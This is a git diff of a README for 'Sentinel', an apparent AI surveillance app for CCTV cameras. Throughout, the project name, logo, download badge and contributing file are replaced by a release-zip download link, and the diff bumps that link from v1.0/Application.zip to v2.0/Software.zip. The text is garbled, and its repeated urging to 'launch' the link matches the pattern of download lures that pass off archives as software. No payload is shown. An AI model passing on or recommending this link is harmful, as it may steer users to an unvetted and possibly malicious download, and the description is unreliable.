@@ -1,18 +1,18 @@
-# 🚀 https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel
+# 🚀 https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel
 
-Welcome to the official repository of **https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel** - a cutting-edge monitoring and surveillance application that revolutionizes the way you interact with CCTV cameras. With visual Q&A capabilities and advanced video captioning features, Sentinel takes surveillance to the next level.
+Welcome to the official repository of **https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel** - a cutting-edge monitoring and surveillance application that revolutionizes the way you interact with CCTV cameras. With visual Q&A capabilities and advanced video captioning features, Sentinel takes surveillance to the next level.
 
-![Sentinel Logo](https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip)
+![Sentinel Logo](https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip)
 
 ## 📁 Repository Contents
 
-In this repository, you will find the latest version of **https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel**, along with documentation, tutorials, and resources to help you get started. Feel free to explore the code, contribute, and collaborate with us to enhance this powerful surveillance tool.
+In this repository, you will find the latest version of **https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel**, along with documentation, tutorials, and resources to help you get started. Feel free to explore the code, contribute, and collaborate with us to enhance this powerful surveillance tool.
 
 ## 🛠️ Installation
 
 To install **Sentinel**, click the button below to download the software package from the link:
 
-[![Download Sentinel Software](https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip%20Sentinel%20Software-Click%20Here-brightgreen)](https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip)
+[![Download Sentinel Software](https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip%20Sentinel%20Software-Click%20Here-brightgreen)](https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip)
 
 *Note: The link above needs to be launched to download the software package.*
 
@@ -51,9 +51,9 @@ Explore the wide range of topics covered in this repository:
 
 ## 🤖 How It Works
 
-**https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel** leverages state-of-the-art AI and computer vision technologies to provide intelligent monitoring and surveillance capabilities. By combining machine learning, real-time inference, and video analytics, Sentinel offers a comprehensive solution for security and safety monitoring.
+**https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel** leverages state-of-the-art AI and computer vision technologies to provide intelligent monitoring and surveillance capabilities. By combining machine learning, real-time inference, and video analytics, Sentinel offers a comprehensive solution for security and safety monitoring.
 
-![AI Surveillance](https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip)
+![AI Surveillance](https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip)
 
 ## 📄 Documentation
 
@@ -61,14 +61,14 @@ Check out the `docs` folder in this repository for detailed documentation on set
 
 ## 🤝 Contributing
 
-We welcome contributions from the open-source community to enhance **https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel**. Whether you want to fix a bug, add a new feature, or improve documentation, your help is valuable. Follow the guidelines in the `https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip` file to contribute to this project.
+We welcome contributions from the open-source community to enhance **https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel**. Whether you want to fix a bug, add a new feature, or improve documentation, your help is valuable. Follow the guidelines in the `https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip` file to contribute to this project.
 
 ## 📞 Contact Us
 
-If you have any questions, suggestions, or feedback regarding **https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel**, feel free to reach out to us. Your input helps us improve and innovate in the field of automated surveillance and safety monitoring.
+If you have any questions, suggestions, or feedback regarding **https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel**, feel free to reach out to us. Your input helps us improve and innovate in the field of automated surveillance and safety monitoring.
 
 Join the **Sentinel** community today and experience the future of surveillance technology!
 
 ---
 
-*Try out **https://github.com/manutyco/sentinel/releases/download/v1.0/Application.zip Sentinel** now and take your surveillance game to the next level!*
+*Try out **https://github.com/manutyco/sentinel/releases/download/v2.0/Software.zip Sentinel** now and take your surveillance game to the next level!*
